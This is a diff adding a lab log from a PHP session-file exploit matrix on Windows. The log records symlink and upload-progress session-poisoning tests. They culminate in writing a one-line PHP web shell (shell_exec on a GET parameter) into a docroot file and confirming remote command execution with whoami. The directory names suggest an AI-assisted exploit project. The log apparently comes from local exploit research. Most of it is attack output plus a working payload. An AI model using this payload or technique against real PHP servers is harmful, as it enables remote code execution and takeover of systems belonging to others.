@@ -1,0 +1,39 @@
+================ PHP 8134 (Windows, ZTS) ================
+ini save_path: C:/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/sess
+--- W1 regular sess file + pipe poison (control)
+before: EXISTS size=18 head=pref|s:6:"keepme";
+after:  EXISTS size=0 head=
+--- W3 symlink -> valid-session target + pipe poison
+link: SYMLINK->/c/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/target_w3.txt
+target before: EXISTS size=18 head=pref|s:6:"keepme";
+target after:  EXISTS size=0 head=
+link after:    SYMLINK->/c/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/target_w3.txt
+--- W2 symlink -> pipe-garbage target (decode fail -> destroy)
+target before: EXISTS size=19 head=GARBAGE_NO_DECODE|x
+target after:  EXISTS size=19 head=GARBAGE_NO_DECODE|x
+link after:    GONE
+--- W4 symlink -> valid-session target + CLEAN key + SLOW upload (transient capture)
+target before: EXISTS size=18 head=pref|s:6:"keepme";
+transient overwrite captured: NO
+target after:  EXISTS size=18 head=pref|s:6:"keepme";
+link after:    SYMLINK->/c/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/target_w4.txt
+--- W5 DANGLING symlink -> nonexistent target + pipe poison
+link: SYMLINK->/c/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/target_w5.txt
+target before: MISSING
+target after:  EXISTS size=0 head=
+link after:    SYMLINK->/c/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/target_w5.txt
+--- W6 DANGLING symlink -> docroot/shell.php + payload key + cleanup=0 + full upload
+payload key: <?php echo "WP3_RCE_OK[".shell_exec($_GET["c"])."]"; ?>
+link: SYMLINK->/c/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/docroot/shell.php
+shell before: MISSING
+shell after:  EXISTS size=457 head=upload_progress_<?php echo "WP3_RCE_OK[".shell_exec($_GET["c
+shell content (first 320B):
+upload_progress_<?php echo "WP3_RCE_OK[".shell_exec($_GET["c"])."]"; ?>|a:5:{s:10:"start_time";i:1792807555;s:14:"content_length";i:65776;s:15:"bytes_processed";i:65776;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f0";s:4:"name";s:9:"notes.txt";s:8:"tmp_name";s:74:"C:\Users\andre\Downloads\php2shell-
+--- W7 GET /shell.php?c=whoami
+upload_progress_WP3_RCE_OK[andre
+]|a:5:{s:10:"start_time";i:1792807555;s:14:"content_length";i:65776;s:15:"bytes_processed";i:65776;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f0";s:4:"name";s:9:"notes.txt";s:8:"tmp_name";s:74:"C:\Users\andre\Downloads\php2shell-claude\wp3\win_lab\8134\tmp\php3C5A.tmp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792807555;s:15:"bytes_processed";i:65536;}}}
+upload_progress_WP3_RCE_OK[WP3_PWNED
+]|a:5:{s:10:"start_time";i:1792807555;s:14:"content_length";i:65776;s:15:"bytes_processed";i:65776;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f0";s:4:"name";s:9:"notes.txt";s:8:"tmp_name";s:74:"C:\Users\andre\Downloads\php2shell-claude\wp3\win_lab\8134\tmp\php3C5A.tmp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792807555;s:15:"bytes_processed";i:65536;}}}
+upload_progress_WP3_RCE_OK[Rasputin
+]|a:5:{s:10:"start_time";i:1792807555;s:14:"content_length";i:65776;s:15:"bytes_processed";i:65776;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f0";s:4:"name";s:9:"notes.txt";s:8:"tmp_name";s:74:"C:\Users\andre\Downloads\php2shell-claude\wp3\win_lab\8134\tmp\php3C5A.tmp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792807555;s:15:"bytes_processed";i:65536;}}}
+=== end 8134 matrix ===
